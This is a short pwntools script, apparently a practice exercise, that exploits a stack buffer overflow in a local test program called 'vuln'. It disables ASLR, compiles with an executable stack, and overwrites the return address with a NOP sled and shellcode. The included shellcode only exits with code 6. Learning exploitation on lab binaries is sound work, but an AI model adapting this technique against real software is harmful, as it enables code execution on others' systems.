# program still needs some adjustments 
# before running, disable stack protections: 
    # disable ASLR:  echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
    # also make sure the stack of vuln program is executable 
    # gcc -z execstack -o vuln vuln.c

from pwn import *

# run local process (vuln program)
proc = process('./vuln') 

# read the first line that the program outputs
proc.recvline() 

# attach to gdb (debugging)
#gdb.attach(proc, '''
##bp *0x7fffffffe340

#''')

# generate shellcode that will cause the process to exit with code 6 
shellcode = shellcraft.exit(6)

# convert shellcode from assembly to binary 
bin = asm(shellcode)

#nop sled 
nop = b"\x90"*16

# rest of padding 
# the address we begin writing to is 272 bytes below the ret addr 
# the return address itself is 8 bytes 
# thus there are 264 bytes left for us to fill in order to overwrite the ret addr
# cyclic() allows us to fill out those bytes, and we subtract the bytes that are taken
# up by our nop sled and shellcode 
padding = cyclic(264-len(bin)-len(nop))

# rip stores the address we want to get $rip to point to 
# this is also the memory address that scanf() begins writing to
# it points to our shellcode
# we found this addresss by setting a bp at main+105 where scanf begins writing 
# and observing where scanf was writing to
rip= p64(0x7fffffffe340)

# concatenate the portions of our exploit
payload = nop+bin+padding+rip

# send input to the process
proc.sendline(payload)

#proc.interactive()
#proc.recvline()
